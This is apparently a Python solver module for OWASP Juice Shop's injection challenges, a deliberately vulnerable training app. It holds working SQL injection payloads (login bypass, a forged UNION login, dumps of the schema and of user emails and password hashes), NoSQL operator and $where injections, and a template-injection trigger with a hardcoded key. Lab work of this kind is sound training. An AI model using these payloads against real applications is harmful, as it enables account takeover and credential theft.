"""Injection category solvers (11 of 14 — the 3 chatbot/LLM-dependent
challenges are out of scope). Verified against Juice Shop's actual
routes/login.ts, routes/search.ts, models/product.ts, models/user.ts and
routes/order.ts source (fetched 2026-08-09)."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/login.ts: verifyPostLoginChallenges just checks the resulting
# user.id after a successful login, regardless of technique. Classic
# comment-based auth bypass, one per target user. ---

@register("loginAdminChallenge", "Injection", 2)
def solve_login_admin(ctx: SolverContext) -> None:
    ctx.client.login(f"admin@{DOMAIN}'--", "irrelevant")


@register("loginBenderChallenge", "Injection", 3)
def solve_login_bender(ctx: SolverContext) -> None:
    ctx.client.login(f"bender@{DOMAIN}'--", "irrelevant")


@register("loginJimChallenge", "Injection", 3)
def solve_login_jim(ctx: SolverContext) -> None:
    ctx.client.login(f"jim@{DOMAIN}'--", "irrelevant")


# --- routes/login.ts + models/user.ts afterValidate hook: a real
# "acc0unt4nt@juice-sh.op" user can never be registered, so the only way to
# log in as one is to forge the row via UNION SELECT. Users table columns
# (models/user.ts, in declaration order + Sequelize's auto id/timestamps):
# id, username, email, password, role, deluxeToken, lastLoginIp,
# profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt (13
# columns). totpSecret must be '' to avoid the 2FA branch. ---

@register("ephemeralAccountantChallenge", "Injection", 4)
def solve_ephemeral_accountant(ctx: SolverContext) -> None:
    email = (
        "x' UNION SELECT 9999,'ephemeral','acc0unt4nt@" + DOMAIN + "','x',"
        "'accounting','','','','',1,'2020-01-01 00:00:00','2020-01-01 00:00:00',NULL-- "
    )
    ctx.client.login(email, "irrelevant")


# --- routes/search.ts: `SELECT * FROM Products WHERE ((name LIKE
# '%${criteria}%' OR description LIKE ...) AND deletedAt IS NULL) ORDER BY
# name`. Products table has exactly 9 columns (models/product.ts: id, name,
# description, price, deluxePrice, image, createdAt, updatedAt, deletedAt),
# so any UNION SELECT here needs exactly 9 columns. ---

# routes/search.ts wraps the LIKE clause in two parens
# (`WHERE ((name LIKE '%${criteria}%' OR ...) AND deletedAt IS NULL)`), so the
# injected criteria must close both of them (`'))`) before the UNION, or
# SQLite raises a syntax error instead of running the query.

@register("dbSchemaChallenge", "Injection", 3)
def solve_db_schema(ctx: SolverContext) -> None:
    # `sql` must land in the `name` (2nd) column, not `id` (1st) — the
    # server only stringifies the row and substring-matches, but the id
    # column is what the challenge's own dbSchemaChallenge check greps.
    q = "zzz')) UNION SELECT '1',sql,'3','4','5','6','7','8','9' FROM sqlite_master-- "
    ctx.client.get("/rest/products/search", params={"q": q}).raise_for_status()


# --- routes/trackOrder.ts: `db.ordersCollection.find({ $where:
# "this.orderId === '${id}'" })`, solved when the injected `$where` matches
# more than one order. Classic NoSQL boolean-OR breakout. ---

@register("noSqlOrdersChallenge", "Injection", 5)
def solve_nosql_orders(ctx: SolverContext) -> None:
    payload = "x' || 'x'=='x"
    ctx.client.get(f"/rest/track-order/{payload}").raise_for_status()


# --- routes/showProductReviews.ts: `db.reviewsCollection.find({ $where:
# 'this.product == ' + id })` (raw JS concat, no quotes) with a
# 2000ms-capped `sleep()` global exposed to that $where context. Injecting a
# `||sleep(9999)` forces the capped-but-still->2000ms busy-wait, tripping the
# `(t1 - t0) > 2000` timing check. ---

@register("noSqlCommandChallenge", "Injection", 4)
def solve_nosql_command(ctx: SolverContext) -> None:
    payload = "0||sleep(9999)"
    ctx.client.get(f"/rest/products/{payload}/reviews").raise_for_status()


# --- routes/updateProductReviews.ts: `db.reviewsCollection.update({ _id:
# req.body.id }, { $set: { message } }, { multi: true })`. Sending a NoSQL
# operator object instead of a literal id makes the filter match every
# document. ---

@register("noSqlReviewsChallenge", "Injection", 4)
def solve_nosql_reviews(ctx: SolverContext) -> None:
    email = f"nosql.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.patch(
        "/rest/products/reviews",
        json={"id": {"$ne": ""}, "message": "NoSQL Injection!"},
    ).raise_for_status()


# --- routes/userProfile.ts: a username matching /#{(.*)}/ unconditionally
# sets req.app.locals.abused_ssti_bug = true on GET /profile (the eval() can
# even fail, the flag is set before the try/catch). routes/verify.ts's
# serverSideChallenges(), mounted at /solve/challenges/server-side, then
# solves sstiChallenge if that flag is true and the fixed key is passed. ---

@register("sstiChallenge", "Injection", 6)
def solve_ssti(ctx: SolverContext) -> None:
    email = f"ssti.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/profile", data={"username": "#{1}"}).raise_for_status()
    ctx.client.get("/profile").raise_for_status()
    ctx.client.get(
        "/solve/challenges/server-side",
        params={"key": "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"},
    ).raise_for_status()


# --- routes/order.ts: placing an order containing the seeded "Christmas
# Super-Surprise-Box (2014 Edition)" product solves this. The product isn't
# shown in normal browsing; find it via search first, falling back to a
# UNION SELECT that also bypasses the `deletedAt IS NULL` filter in case it
# is soft-deleted. ---

@register("christmasSpecialChallenge", "Injection", 4)
def solve_christmas_special(ctx: SolverContext) -> None:
    email = f"xmas.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    basket_id = login_resp.json()["authentication"]["bid"]

    resp = ctx.client.get("/rest/products/search", params={"q": "Christmas"})
    resp.raise_for_status()
    products = resp.json().get("data", [])
    product = next((p for p in products if "Christmas" in p.get("name", "")), None)

    if product is None:
        q = (
            "zzz')) UNION SELECT id,name,description,price,deluxePrice,image,"
            "'2020-01-01 00:00:00','2020-01-01 00:00:00',NULL FROM Products "
            "WHERE name LIKE '%Christmas%'-- "
        )
        resp = ctx.client.get("/rest/products/search", params={"q": q})
        resp.raise_for_status()
        products = resp.json().get("data", [])
        product = products[0] if products else None

    if product is None:
        raise RuntimeError("could not locate the Christmas special product")

    ctx.client.post(
        "/api/BasketItems",
        json={"ProductId": product["id"], "BasketId": basket_id, "quantity": 1},
    ).raise_for_status()
    ctx.client.post(f"/rest/basket/{basket_id}/checkout").raise_for_status()


# --- routes/search.ts's async post-response check requires that the *exact*
# same search response contain a matching row for every currently-registered
# user's email+password. Registered last so no later solver in this module
# creates a new user in the window between this request firing and the
# server's async UserModel.findAll() completing — a new user showing up
# after this response was captured would make the check fail. ---

@register("unionSqlInjectionChallenge", "Injection", 4)
def solve_union_sql_injection(ctx: SolverContext) -> None:
    q = "zzz')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users-- "
    ctx.client.get("/rest/products/search", params={"q": q}).raise_for_status()
